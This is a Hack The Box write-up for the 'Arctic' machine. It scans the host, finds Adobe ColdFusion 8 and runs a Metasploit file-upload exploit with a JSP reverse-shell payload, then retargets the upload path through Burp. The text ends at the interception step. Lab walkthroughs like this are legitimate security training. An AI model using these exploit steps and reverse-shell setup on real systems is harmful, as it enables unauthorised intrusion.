### Arctic HTB

### Difficulty: Easy

### IP Address = 10.10.10.11

Nmap Scan:

```
──(mark㉿haxor)-[~/Desktop/B2B/HTB/Arctic]
└─$ nmap -sCV -A 10.10.10.11 -p135,8500 -oN nmapscan -Pn
Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-20 05:07 WAT
Nmap scan report for 10.10.10.11
Host is up (0.31s latency).

PORT     STATE SERVICE VERSION
135/tcp  open  msrpc   Microsoft Windows RPC
8500/tcp open  fmtp?
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 165.17 seconds

```

On heading to the service on port 8500 we see its a web server and that its indexed 

Meaning we can list and navigate through files (directory listing)
![image](https://user-images.githubusercontent.com/113513376/213615555-41e799c1-6159-4afe-b1a9-04ad2a7383ef.png)


After poking around i got this url `http://10.10.10.11:8500/CFIDE/administrator/` 

Which when navigated to shows a login page
![image](https://user-images.githubusercontent.com/113513376/213615935-f3fa8b85-7df9-4595-9481-9d52274f5c76.png)

And from the image we see its version also in the logo `Adobe ColdFusion 8`

Now lets fire metasploit and search for possible exploits

```                                                                                                    
┌──(mark㉿haxor)-[~/Desktop/B2B/HTB/Arctic]
└─$ msfconsole
                                                  
                          ########                  #
                      #################            #
                   ######################         #
                  #########################      #
                ############################
               ##############################
               ###############################
              ###############################
              ##############################
                              #    ########   #
                 ##        ###        ####   ##
                                      ###   ###
                                    ####   ###
               ####          ##########   ####
               #######################   ####
                 ####################   ####
                  ##################  ####
                    ############      ##
                       ########        ###
                      #########        #####
                    ############      ######
                   ########      #########
                     #####       ########
                       ###       #########
                      ######    ############
                     #######################
                     #   #   ###  #   #   ##
                     ########################
                      ##     ##   ##     ##
                            https://metasploit.com


       =[ metasploit v6.2.9-dev                           ]
+ -- --=[ 2229 exploits - 1177 auxiliary - 398 post       ]
+ -- --=[ 867 payloads - 45 encoders - 11 nops            ]
+ -- --=[ 9 evasion                                       ]

Metasploit tip: To save all commands executed since start up 
to a file, use the makerc command

[*] Starting persistent handler(s)...
msf6 > 
```

Then search `coldfusion 8 `

```
msf6 > search coldfusion 8

Matching Modules
================

   #  Name                                                Disclosure Date  Rank       Check  Description
   -  ----                                                ---------------  ----       -----  -----------
   0  exploit/multi/http/coldfusion_ckeditor_file_upload  2018-09-11       excellent  No     Adobe ColdFusion CKEditor unrestricted file upload
   1  auxiliary/scanner/http/adobe_xml_inject                              normal     No     Adobe XML External Entity Injection
   2  exploit/windows/http/coldfusion_fckeditor           2009-07-03       excellent  No     ColdFusion 8.0.1 Arbitrary File Upload and Execute
   3  auxiliary/scanner/http/coldfusion_locale_traversal                   normal     No     ColdFusion Server Check
   4  auxiliary/gather/jetty_web_inf_disclosure           2021-07-15       normal     Yes    Jetty WEB-INF File Disclosure


Interact with a module by name or index. For example info 4, use 4 or use auxiliary/gather/jetty_web_inf_disclosure
```

Checking out the exploit

```
msf6 exploit(multi/http/coldfusion_ckeditor_file_upload) > use 0
[*] Using configured payload java/jsp_shell_reverse_tcp
msf6 exploit(multi/http/coldfusion_ckeditor_file_upload) > set rhosts 10.10.10.11
rhosts => 10.10.10.11
msf6 exploit(multi/http/coldfusion_ckeditor_file_upload) > set lhost tun0
lhost => tun0
msf6 exploit(multi/http/coldfusion_ckeditor_file_upload) > run

[*] Started reverse TCP handler on 10.10.16.7:4444 
[*] Uploading the JSP payload at /cf_scripts/scripts/ajax/ckeditor/plugins/filemanager/uploadedFiles/IYTSIKNIN.jsp...
[-] Exploit aborted due to failure: unknown: Upload Failed...
[*] Exploit completed, but no session was created.
```

Ok it failed but why?

Its cause the path its trying to upload our payload doesn't exist

But since we have directory listing we can find the right path

After playing around for some minutes i found this path `/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/cf_upload.cfm` 

So instead of the exploit to attempt to upload the file in `/cf_scripts/scripts/ajax/ckeditor/plugins/filemanager/uploadedFiles/` 

I can rather make it upload in the path i want

To do this i need to intercept the request in burp

So in the exploit i'll add this 

```
msf6 exploit(multi/http/coldfusion_ckeditor_file_upload) > set proxies http:127.0.0.1:8080
proxies => http:127.0.0.1:8080
```

Now i'll try to re-run the exploit and intercept it in burp 
![image](https://user-images.githubusercontent.com/113513376/213618734-020e0c36-a378-4852-b1db-18c61553705e.png)

So I will just change the path to the right one which is `/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/cf_upload.cfm` 
![image](https://user-images.githubusercontent.com/113513376/213618807-a9c6d0f8-c06a-4961-8a97-e3588e09f0b8.png)

